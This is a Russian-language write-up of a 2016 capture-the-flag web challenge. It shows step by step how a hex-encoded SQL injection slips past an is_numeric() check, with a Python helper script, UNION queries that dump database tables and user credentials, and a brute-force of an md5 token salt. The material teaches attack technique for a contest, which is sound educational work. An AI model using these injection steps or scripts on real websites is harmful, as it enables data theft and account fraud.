SSCTF 2016 quals Write-up
=====
AFSRC-Market (Web, 500p)
---

![alt-text][main_page]

Просмотрев главную страницу становится понятно, что форма поиска не функционирует.
При попытке добавить какой-либо товар в корзину появляетя просьба войти на сайт и
происходит редирект на страницу входа.
При нажатии на сами товары просиходит переход по ссылке `https://security.alipay.com/`.

![alt-text][alert_msg]

![alt-text][login_page]

На странице входа требуется ввести логин, пароль и капчу. Попытки использовать различные
служебные символы не приводят к неожиданному поведению сайта.
Перейдем к странице регистрации.

![alt-text][register_page]

Попробуем зарегистрировать какого-либо пользователя.

![alt-text][reg_success]

![alt-text][try_login]

Видим сообщение об успешной регистрации и нас перенаправляют на страницу входа. Пытаемся зайти и... Успех!

![alt-text][login_success]

В шапке сайта появились ссылки на профиль пользователя и кнопка выхода. Форма поиска как и раньше не функционирует.
Заметим, что после авторизации в cookie была добавлена единственное значение PHPSESSID - идентификатор сессии в PHP.
Теперь при попытке добавить товар в корзину осуществляется переход по ссылке вида
`http://edb24e7c.seclover.com/add_cart.php?id=XXX` где вместо `XXX` какой-нибудь номер.
После этого окрывается домашняя страница и больше ничего не происходит.
При попытке вставить в параметр `id` различные числа всегда появляется сообщение об успешном добавлении,
при вводе символов, не являющихся цифрами, выдается сообщние об ошибке. Также допистим ввод следующего типа: `id=0x123456`.
Это говорит о том, что параметр `id` скорее всего проверяетя с помощью PHP функции `is_numeric()` перед вставкой в запрос.

![alt-text][user_page]

Теперь рассмотрим страницу пользователя. В шапке сайта появляеся ссылка `AddMoney` на
`http://edb24e7c.seclover.com/addmoney.php`, при переходе по которой выводится сообщение.
Также имеются 3 переключаемые вкладки: `Description`, `Additional Information`, `MyInfo`.
Первые две вкладки не так интересны, т.к. скорее всего являются статическими, а третяя содержит форму
для добавления денег. Попробуем отправить форму и получим сообщение об ошибе. Также внимание привлекает
строка `The Last cost: 0`, попробуем выяснить, откуда взялось значение `0`.
После небольшого исследования становится ясно, что при каждом запросе `/add_cart.php?id=XXX` при указании верного числа в `id` значение принимает случайное ненулевое значение. Если `id=0x123456` или другой случайный hex, то значение обнуляется.
Итак, значение `The Last cost` каким-то оразом зависит от параметра `id` при добавлении товара. Как уже было сказано, скорее всего значение параметра `id` проверяется с помощью функции `is_numeric()`, которая пропускает hex, попробует совершить простую "is_numeric bypass" sql-иньекцию через параметр `id`. Для генерации hex-значение воспользуемся `python3`
```python
>>> hex(int.from_bytes(b'1 AND 1=2 ; -- ', 'big'))
'0x3120414e4420313d32203b202d2d20'
```

![alt-text][try_simple_inj]

![alt-text][simple_inj_result]

Как видно на скрине, значение стало пустым. Для удобства исследование напишем функцию на Python, которая будет
отправлять нужный запрос, и получать новое значение со страницы пользователя.

```python
import requests
import re


URL = 'http://edb24e7c.seclover.com/'
regexp = r'<p>The Last cost: (.*?)</p>'
cookies = {'PHPSESSID': 'ckf3pes604sgtr3vpp3lrc62t4'}


def sql(query):
    hexed = hex(int.from_bytes(query.encode(), 'big'))
    requests.get(URL + '/add_cart.php', params={'id': hexed}, cookies=cookies)
    result = requests.get(URL + '/userinfo.php', cookies=cookies).text
    match_obj = re.search(regexp, result)
    if match_obj:
        return match_obj.group(1)

```

После чего приступим к запросам:

```python
>>> sql('1')
'1103'
>>> sql('1 AND 1=1 GROUP BY 1 ; -- ')
'4024'
>>> sql('1 AND 1=1 GROUP BY 2 ; -- ')
'7939'
>>> sql('1 AND 1=1 GROUP BY 3 ; -- ')
'501'
>>> sql('1 AND 1=1 GROUP BY 4 ; -- ')
'2059'
>>> sql('1 AND 1=1 GROUP BY 5 ; -- ')
'0'
>>> sql('1 AND 1=2 UNION SELECT "first", "second", "third", "fourth" ; -- ')
'third'
```

Итак, мы выяснили, что результатом запроса должна быть строка из четырех элементов, причем мы можем смотреть значение третьего элемента. Продолжим извлечение данных из базы данных.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, database(), 4 ; -- ')
'web05'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="web05"), 4 ; -- ')
'flag,user,user_goods'
```

Видим очень интересное название таблицы - `flag`.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="web05" AND table_name="flag"), 4 ; -- ')
'id,flag'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT COUNT(*) FROM flag), 4 ; -- ')
'1'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT CONCAT(id, ",", flag) FROM flag), 4 ; -- ')
'1,Tips:/2112jb1njIUIJ__tr_R/tips.txt'
```

Попробуем перейти на `/2112jb1njIUIJ__tr_R/tips.txt`.

> tips:
>
> 1、Congratulations for you !You finished 80%,Come on continue!
>
> 2、token=md5(md5(username)+salt) salt max lenght is 5(hexs)
>
> 3、Add the Money Get the Flag

Во второй подсказке говорится о каком-то токене. А чтобы получить флаг, нужно пополнить счет.
Вернемся к форме пополнение денег и посмотрим исходный код формы.

![alt-text][form_source]

Видим, что в форме есть скрытый параметр `salt`, осталось его подобрать, но для этого необходим `token`.
Вернемся к базе данных и посмотрим, какие данные хранятся для пользователя.

```python
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="web05" AND table_name="user"), 4 ; -- ')
'id,username,password,token,scores'
>>> sql('1 AND 1=2 UNION SELECT 1, 2, (SELECT CONCAT(id,",",username,",",password,",",token,",",scores) FROM user WHERE username="a1ex01234"), 4 ; -- ')
'1086,a1ex01234,a1412c40bab245f4a17b675263cae6f7,d77716fc244dcdd08b5de5a82375e437,0'
```

Итак, мы получили `token`, который генерируется для каждого пользователя. Воспользовшись второй подсказкой подберем подходящую соль. Для этого опять воспользуемся `python3`, для перебора будет полезна библиотека `itertools`.

```python
import itertools
from hashlib import md5


username = b'a1ex01234'
hex_char = '0123456789abcdef'
token = 'd77716fc244dcdd08b5de5a82375e437'

for salt in itertools.product(hex_char, repeat=5):
    salt = ''.join(salt)
    hash_val = md5(md5(username).hexdigest().encode() + salt.encode()).hexdigest()
    if hash_val == token:
        print('Salt =', salt)
        break
```

Запустим скрипт и видем результат: `Salt = 8b76d`. Добавим её в форму пополнения счета.

![alt-text][flag_is]

Получаем флаг!

[main_page]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Главная страница"
[alert_msg]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Предупреждение"
[login_page]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Страница входа"
[register_page]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Страница регистрации"
[reg_success]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Успешная регистрация"
[try_login]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Попытка войти"
[login_success]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Вход прошел успешно"
[user_page]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Страница пользователя"
[try_simple_inj]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Попытка вставить простую sql-инъекцию"
[simple_inj_result]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Результат sql-иъекции"
[form_source]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Исходный код формы пополнения счета"
[flag_is]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Флаг"
